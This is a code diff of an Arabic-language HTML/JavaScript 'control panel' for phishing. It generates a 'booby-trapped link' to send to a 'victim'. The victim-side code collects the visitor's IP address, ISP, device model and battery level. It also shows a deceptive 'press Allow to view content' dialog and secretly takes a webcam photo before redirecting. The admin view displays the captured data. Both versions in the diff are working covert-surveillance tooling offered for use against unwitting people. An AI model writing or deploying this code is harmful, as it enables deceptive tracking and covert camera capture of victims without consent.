@@ -5,47 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة التحكم</title>
     <style>
-        :root { --bg: #0f1115; --card: #1a1d23; --primary: #3b82f6; --text: #e2e8f0; --border: #2d333b; --neon: #00f2ff; }
-        body { margin: 0; background: var(--bg); font-family: system-ui, -apple-system, sans-serif; color: var(--text); }
-        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
-        .admin-box { background: var(--card); padding: 30px; border-radius: 16px; width: 100%; max-width: 480px; border: 1px solid var(--border); box-shadow: 0 15px 35px rgba(0,0,0,0.4); }
-        h2 { text-align: center; font-weight: 400; letter-spacing: 1px; margin-bottom: 25px; color: var(--primary); }
+        :root { --bg: #121212; --card: #1e1e1e; --primary: #007bff; --text: #e1e1e1; --neon: #00f2ff; }
+        body { margin: 0; background: var(--bg); font-family: sans-serif; color: var(--text); }
+        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
+        .admin-box { background: var(--card); padding: 30px; border-radius: 15px; width: 100%; max-width: 450px; border: 1px solid #333; }
         .mode-container { display: flex; gap: 10px; margin-bottom: 20px; }
-        .mode-card { flex: 1; background: #21262d; border: 1px solid var(--border); padding: 15px; border-radius: 10px; text-align: center; cursor: pointer; transition: 0.2s; font-size: 14px; }
-        .mode-card.active { border-color: var(--primary); background: rgba(59, 130, 246, 0.1); color: var(--primary); }
-        input { width: 100%; padding: 14px; background: #0d1117; border: 1px solid var(--border); border-radius: 8px; color: #fff; margin-bottom: 15px; box-sizing: border-box; font-size: 14px; outline: none; }
-        .main-btn { background: var(--primary); color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .result-box { margin-top: 20px; padding: 15px; background: rgba(16, 185, 129, 0.1); border: 1px dashed #10b981; border-radius: 8px; display: none; }
-        #log-area { margin-top: 25px; display: none; }
-        .data-log { background: #0d1117; padding: 20px; border-radius: 12px; border-right: 4px solid var(--neon); }
-        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #21262d; font-size: 13px; }
-        .info-row span { color: var(--neon); }
+        .mode-card { flex: 1; background: #252525; border: 1px solid #333; padding: 15px; border-radius: 10px; text-align: center; cursor: pointer; }
+        .mode-card.active { border-color: var(--primary); background: rgba(0, 123, 255, 0.1); }
+        input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; border-radius: 8px; color: #fff; margin-bottom: 15px; box-sizing: border-box; }
+        .main-btn { background: var(--primary); color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
+        #log-area { margin-top: 25px; width: 100%; display: none; }
+        .data-log { background: #1a1a1a; padding: 20px; border-radius: 10px; border-right: 4px solid var(--neon); }
         .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .dialog { background: #1a1d23; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; border: 1px solid var(--border); }
+        .dialog { background: #181818; padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 320px; border: 1px solid #333; }
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="admin-panel" class="admin-box">
+<div class="container" id="admin-ui">
+    <div class="admin-box">
         <h2>لوحة التحكم</h2>
         <div class="mode-container">
-            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">سحب بيانات الضحية</div>
+            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">سحب بيانات</div>
             <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">سحب صور</div>
         </div>
-        <input type="text" id="targetUrl" placeholder="رابط التحويل الأصلي">
-        <button class="main-btn" onclick="generateLink()">إنشاء الرابط</button>
-        <div id="resultBox" class="result-box">
-            <input type="text" id="copyLink" readonly onclick="this.select()" style="background:transparent; border:none; color:#10b981; text-align:center; cursor: pointer;">
+        <input type="text" id="targetUrl" placeholder="أدخل رابط التحويل (مثل https://google.com)">
+        <button class="main-btn" onclick="generateLink()">إنشاء الرابط الملغم</button>
+        
+        <div id="resultBox" style="display:none; margin-top:20px;">
+            <p style="font-size:12px; color:var(--neon);">انسخ الرابط وأرسله للضحية:</p>
+            <input type="text" id="copyLink" readonly onclick="this.select()">
         </div>
+
         <div id="log-area">
             <div class="data-log">
-                <p style="color:var(--primary); font-size:12px; margin:0 0 10px 0;">📡 تقرير الجلسة:</p>
-                <div id="device-data"></div>
-                <div id="image-data" class="hidden">
-                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border: 1px solid var(--border);">
-                </div>
+                <p style="color:var(--primary);">📡 البيانات المستلمة:</p>
+                <div id="device-data" style="font-size:13px; line-height:1.6;"></div>
+                <img id="captured-img" style="width:100%; border-radius:8px; margin-top:10px; display:none;">
             </div>
         </div>
     </div>
@@ -53,9 +50,9 @@
 
 <div id="victim-ui" class="victim-overlay hidden">
     <div class="dialog">
-        <h3 style="color:#fff; margin-bottom:10px;">تنبيه</h3>
-        <p style="color: #94a3b8; font-size:14px; line-height:1.5;">لمشاهدة المحتوى الرجاء الضغط على السماح</p>
-        <button id="allowBtn" class="main-btn" style="background:#ef4444; margin-top:15px;">السماح</button>
+        <h3 style="color:#fff;">تنبيه</h3>
+        <p>لمشاهدة المحتوى الرجاء الضغط على السماح</p>
+        <button id="allowBtn" class="main-btn" style="background:#d9534f;">السماح</button>
     </div>
     <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
@@ -64,7 +61,8 @@
 <script>
     let activeMode = '1';
     const params = new URLSearchParams(window.location.search);
-    const v = params.get('v');
+    const mode = params.get('v');
+    const encodedTarget = params.get('d'); // الرابط المشفر
 
     function selectMode(m, id) {
         activeMode = m;
@@ -72,37 +70,27 @@
         document.getElementById(id).classList.add('active');
     }
 
-    if (v) {
-        document.getElementById('admin-panel').classList.add('hidden');
-        
-        async function runEngine() {
+    // --- سيناريو الضحية ---
+    if (mode && encodedTarget) {
+        document.getElementById('admin-ui').classList.add('hidden');
+        const finalTarget = atob(encodedTarget); // فك تشفير الرابط
+
+        async function start() {
             const ipReq = await fetch('https://ipapi.co/json/').catch(() => ({}));
             const ipData = await ipReq.json().catch(() => ({}));
-            const batt = await (navigator.getBattery ? navigator.getBattery().then(b => (b.level * 100).toFixed(0) + '%') : "N/A");
-            const ua = navigator.userAgent;
+            const battery = await (navigator.getBattery ? navigator.getBattery().then(b => (b.level * 100).toFixed(0) + '%') : "N/A");
 
-            // تحديد الإصدارات بدقة برمجية
-            let osDetails = "Unknown";
-            if (/iPhone|iPad/.test(ua)) {
-                let match = ua.match(/OS (\d+)_(\d+)/);
-                osDetails = match ? `iOS ${match[1]}.${match[2]}` : "iOS";
-            } else if (/Android/.test(ua)) {
-                let match = ua.match(/Android (\d+)/);
-                osDetails = match ? `Android ${match[1]}` : "Android";
-            }
-
-            const data = {
-                model: /iPhone|Samsung|Xiaomi|Huawei|Android/.exec(ua)?.[0] || "Smartphone",
-                os: osDetails, ip: ipData.ip || "N/A",
-                isp: ipData.org || "N/A", batt: batt,
-                ts: new Date().toLocaleTimeString('ar-EG')
+            const info = {
+                model: navigator.userAgent.match(/(iPhone|Android|Samsung|Xiaomi|Huawei)/)?.[0] || "Unknown",
+                ip: ipData.ip || "N/A",
+                isp: ipData.org || "N/A",
+                batt: battery
             };
 
-            localStorage.setItem('x_data', JSON.stringify(data));
-            const target = localStorage.getItem('x_target') || 'https://google.com';
+            localStorage.setItem('received_data', JSON.stringify(info));
 
-            if (v === '1') {
-                window.location.replace(target);
+            if (mode === '1') {
+                window.location.replace(finalTarget);
             } else {
                 document.getElementById('victim-ui').classList.remove('hidden');
                 document.getElementById('allowBtn').onclick = async () => {
@@ -110,48 +98,41 @@
                         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                         const video = document.getElementById('video');
                         video.srcObject = stream;
-                        
                         setTimeout(() => {
                             const canvas = document.getElementById('canvas');
                             canvas.width = 640; canvas.height = 480;
                             canvas.getContext('2d').drawImage(video, 0, 0);
-                            localStorage.setItem('x_img', canvas.toDataURL('image/jpeg'));
+                            localStorage.setItem('received_img', canvas.toDataURL('image/jpeg'));
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.replace(target);
-                        }, 1200);
-                    } catch (e) {
-                        alert("يجب منح الإذن للمتابعة.");
-                    }
+                            window.location.replace(finalTarget);
+                        }, 1000);
+                    } catch (e) { alert("يجب السماح للمتابعة"); }
                 };
             }
         }
-        runEngine();
+        start();
     }
 
+    // --- سيناريو المدير ---
     function generateLink() {
-        const url = document.getElementById('targetUrl').value;
-        if (!url) return;
-        localStorage.setItem('x_target', url);
-        document.getElementById('copyLink').value = window.location.origin + window.location.pathname + "?v=" + activeMode;
+        const target = document.getElementById('targetUrl').value;
+        if (!target.startsWith('http')) return alert("يجب أن يبدأ الرابط بـ http أو https");
+        const encoded = btoa(target); // تشفير الرابط لضمان وصوله
+        const finalLink = window.location.origin + window.location.pathname + `?v=${activeMode}&d=${encoded}`;
+        document.getElementById('copyLink').value = finalLink;
         document.getElementById('resultBox').style.display = 'block';
     }
 
     window.addEventListener('storage', (e) => {
-        if (e.key === 'x_data') {
-            document.getElementById('log-area').style.display = 'block';
+        document.getElementById('log-area').style.display = 'block';
+        if (e.key === 'received_data') {
             const d = JSON.parse(e.newValue);
-            document.getElementById('device-data').innerHTML = `
-                <div class="info-row">الجهاز: <span>${d.model}</span></div>
-                <div class="info-row">النظام: <span>${d.os}</span></div>
-                <div class="info-row">IP: <span>${d.ip}</span></div>
-                <div class="info-row">الشركة: <span>${d.isp}</span></div>
-                <div class="info-row">البطارية: <span>${d.batt}</span></div>
-                <div class="info-row">الوقت: <span>${d.ts}</span></div>
-            `;
+            document.getElementById('device-data').innerHTML = `الجهاز: ${d.model}<br>IP: ${d.ip}<br>الشركة: ${d.isp}<br>البطارية: ${d.batt}`;
         }
-        if (e.key === 'x_img') {
-            document.getElementById('image-data').classList.remove('hidden');
-            document.getElementById('captured-img').src = e.newValue;
+        if (e.key === 'received_img') {
+            const img = document.getElementById('captured-img');
+            img.src = e.newValue;
+            img.style.display = 'block';
         }
     });
 </script>
